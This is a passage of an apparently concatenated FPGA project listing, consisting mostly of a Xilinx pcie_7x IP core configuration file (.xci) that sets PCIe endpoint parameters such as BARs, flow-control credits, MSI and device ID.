            <xilinx:configElementInfo xilinx:referenceId="BUSIFPARAM_VALUE.S_AXIS.TDATA_NUM_BYTES" xilinx:valueSource="auto"/>
            <xilinx:configElementInfo xilinx:referenceId="PARAM_VALUE.FIFO_DEPTH" xilinx:valueSource="user"/>
            <xilinx:configElementInfo xilinx:referenceId="PARAM_VALUE.FIFO_MODE" xilinx:valueSource="user"/>
            <xilinx:configElementInfo xilinx:referenceId="PARAM_VALUE.HAS_TLAST" xilinx:valueSource="user"/>
            <xilinx:configElementInfo xilinx:referenceId="PARAM_VALUE.IS_ACLK_ASYNC" xilinx:valueSource="user"/>
            <xilinx:configElementInfo xilinx:referenceId="PARAM_VALUE.TDATA_NUM_BYTES" xilinx:valueSource="user"/>
          </xilinx:configElementInfos>
        </xilinx:componentInstanceExtensions>
      </spirit:vendorExtensions>
    </spirit:componentInstance>
  </spirit:componentInstances>
</spirit:design>

```

`ip/pcie_7x_0.xci`:

```xci
<?xml version="1.0" encoding="UTF-8"?>
<spirit:design xmlns:xilinx="http://www.xilinx.com" xmlns:spirit="http://www.spiritconsortium.org/XMLSchema/SPIRIT/1685-2009" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <spirit:vendor>xilinx.com</spirit:vendor>
  <spirit:library>xci</spirit:library>
  <spirit:name>unknown</spirit:name>
  <spirit:version>1.0</spirit:version>
  <spirit:componentInstances>
    <spirit:componentInstance>
      <spirit:instanceName>pcie_7x_0</spirit:instanceName>
      <spirit:componentRef spirit:vendor="xilinx.com" spirit:library="ip" spirit:name="pcie_7x" spirit:version="3.3"/>
      <spirit:configurableElementValues>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.CLK.SYS_CLK.ASSOCIATED_BUSIF"/>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.CLK.SYS_CLK.ASSOCIATED_RESET"/>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.CLK.SYS_CLK.CLK_DOMAIN"/>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.CLK.SYS_CLK.FREQ_HZ">100000000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.CLK.SYS_CLK.INSERT_VIP">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.CLK.SYS_CLK.PHASE">0.000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.CLK.USER_CLK_OUT.CLK_DOMAIN"/>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.CLK.USER_CLK_OUT.INSERT_VIP">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.CLK.USER_CLK_OUT.PHASE">0.000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_AXIS_RX.CLK_DOMAIN"/>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_AXIS_RX.FREQ_HZ">100000000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_AXIS_RX.HAS_TKEEP">1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_AXIS_RX.HAS_TLAST">1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_AXIS_RX.HAS_TREADY">1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_AXIS_RX.HAS_TSTRB">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_AXIS_RX.INSERT_VIP">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_AXIS_RX.LAYERED_METADATA">undef</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_AXIS_RX.PHASE">0.000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_AXIS_RX.TDATA_NUM_BYTES">8</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_AXIS_RX.TDEST_WIDTH">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_AXIS_RX.TID_WIDTH">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_AXIS_RX.TUSER_WIDTH">22</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.RST.SYS_RST_N.INSERT_VIP">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.RST.USER_RESET_OUT.INSERT_VIP">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_AXIS_TX.CLK_DOMAIN"/>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_AXIS_TX.FREQ_HZ">100000000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_AXIS_TX.HAS_TKEEP">1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_AXIS_TX.HAS_TLAST">1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_AXIS_TX.HAS_TREADY">1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_AXIS_TX.HAS_TSTRB">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_AXIS_TX.INSERT_VIP">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_AXIS_TX.LAYERED_METADATA">undef</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_AXIS_TX.PHASE">0.000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_AXIS_TX.TDATA_NUM_BYTES">8</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_AXIS_TX.TDEST_WIDTH">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_AXIS_TX.TID_WIDTH">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_AXIS_TX.TUSER_WIDTH">4</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.CFG_CTL_IF">TRUE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.CFG_FC_IF">TRUE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.CFG_MGMT_IF">TRUE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.CFG_STATUS_IF">TRUE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.C_DATA_WIDTH">64</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.ENABLE_JTAG_DBG">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.ERR_REPORTING_IF">TRUE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.EXT_CH_GT_DRP">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.EXT_PIPE_INTERFACE">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.EXT_STARTUP_PRIMITIVE">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.LINK_CAP_MAX_LINK_WIDTH">1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.PCIE_ASYNC_EN">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.PCIE_EXT_CLK">TRUE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.PCIE_EXT_GT_COMMON">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.PIPE_SIM">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.PL_INTERFACE">TRUE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.RCV_MSG_IF">TRUE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.SHARED_LOGIC_IN_CORE">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.TRANSCEIVER_CTRL_STATUS_PORTS">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.bar_0">FFFFF800</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.bar_1">00000000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.bar_2">00000000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.bar_3">00000000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.bar_4">00000000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.bar_5">00000000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.bram_lat">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_aer_base_ptr">000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_aer_cap_ecrc_check_capable">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_aer_cap_ecrc_gen_capable">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_aer_cap_multiheader">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_aer_cap_nextptr">000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_aer_cap_on">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_aer_cap_optional_err_support">000000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_aer_cap_permit_rooterr_update">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_buf_opt_bma">TRUE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_component_name">pcie_7x_0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_cpl_inf">TRUE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_cpl_infinite">TRUE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_cpl_timeout_disable_sup">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_cpl_timeout_range">0010</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_cpl_timeout_ranges_sup">2</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_d1_support">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_d2_support">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_de_emph">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_dev_cap2_ari_forwarding_supported">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_dev_cap2_atomicop32_completer_supported">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_dev_cap2_atomicop64_completer_supported">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_dev_cap2_atomicop_routing_supported">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_dev_cap2_cas128_completer_supported">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_dev_cap2_tph_completer_supported">00</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_dev_control_ext_tag_default">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_dev_port_type">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_dis_lane_reverse">TRUE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_disable_rx_poisoned_resp">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_disable_scrambling">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_disable_tx_aspm_l0s">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_dll_lnk_actv_cap">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_dsi_bool">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_dsn_base_ptr">100</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_dsn_cap_enabled">TRUE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_dsn_next_ptr">000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_enable_msg_route">00000000000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_ep_l0s_accpt_lat">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_ep_l1_accpt_lat">7</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_ext_pci_cfg_space_addr">3FF</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_fc_cpld">77</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_fc_cplh">36</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_fc_npd">24</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_fc_nph">12</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_fc_pd">53</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_fc_ph">32</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_gen1">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_header_type">00</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_hw_auton_spd_disable">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_last_cfg_dw">10C</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_link_cap_aspm_optionality">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_ll_ack_timeout">0000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_ll_ack_timeout_enable">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_ll_ack_timeout_function">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_ll_replay_timeout">0000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_ll_replay_timeout_enable">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_ll_replay_timeout_func">1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_msi">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_msi_64b_addr">TRUE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_msi_cap_on">TRUE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_msi_mult_msg_extn">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_msi_per_vctr_mask_cap">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_msix_cap_on">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_msix_next_ptr">00</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_msix_pba_bir">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_msix_pba_offset">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_msix_table_bir">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_msix_table_offset">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_msix_table_size">000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_pci_cfg_space_addr">3E</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_pcie_blk_locn">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_pcie_cap_next_ptr">00</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_pcie_cap_slot_implemented">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_pcie_dbg_ports">TRUE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_pcie_fast_config">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_perf_level_high">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_phantom_functions">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_pm_cap_next_ptr">48</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_pme_support">0F</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_rbar_base_ptr">000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_rbar_cap_control_encodedbar0">00</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_rbar_cap_control_encodedbar1">00</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_rbar_cap_control_encodedbar2">00</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_rbar_cap_control_encodedbar3">00</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_rbar_cap_control_encodedbar4">00</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_rbar_cap_control_encodedbar5">00</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_rbar_cap_index0">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_rbar_cap_index1">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_rbar_cap_index2">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_rbar_cap_index3">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_rbar_cap_index4">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_rbar_cap_index5">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_rbar_cap_nextptr">000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_rbar_cap_on">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_rbar_cap_sup0">00001</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_rbar_cap_sup1">00001</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_rbar_cap_sup2">00001</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_rbar_cap_sup3">00001</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_rbar_cap_sup4">00001</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_rbar_cap_sup5">00001</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_rbar_num">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_rcb">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_recrc_check">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_recrc_check_trim">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_root_cap_crs">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_rx_raddr_lat">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_rx_ram_limit">1FF</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_rx_rdata_lat">2</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_rx_write_lat">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_silicon_rev">2</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_slot_cap_attn_butn">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_slot_cap_attn_ind">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_slot_cap_elec_interlock">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_slot_cap_hotplug_cap">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_slot_cap_hotplug_surprise">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_slot_cap_mrl">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_slot_cap_no_cmd_comp_sup">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_slot_cap_physical_slot_num">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_slot_cap_pwr_ctrl">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_slot_cap_pwr_ind">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_slot_cap_pwr_limit_scale">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_slot_cap_pwr_limit_value">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_trgt_lnk_spd">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_trn_np_fc">TRUE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_tx_last_tlp">13</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_tx_raddr_lat">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_tx_rdata_lat">2</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_tx_write_lat">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_upconfig_capable">TRUE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_upstream_facing">TRUE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_ur_atomic">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_ur_inv_req">TRUE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_ur_prs_response">TRUE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_vc_base_ptr">000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_vc_cap_enabled">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_vc_cap_reject_snoop">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_vc_next_ptr">000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_vsec_base_ptr">000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_vsec_cap_enabled">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_vsec_next_ptr">000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.c_xlnx_ref_board">NONE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.cap_ver">2</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.cardbus_cis_ptr">00000000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.class_code">020000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.cmps">1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.con_scl_fctr_d0_state">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.con_scl_fctr_d1_state">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.con_scl_fctr_d2_state">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.con_scl_fctr_d3_state">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.cost_table">1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.d1_sup">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.d2_sup">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.dev_id">1337</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.dev_port_type">0000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.dis_scl_fctr_d0_state">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.dis_scl_fctr_d1_state">0</spirit:configurableElementValue>
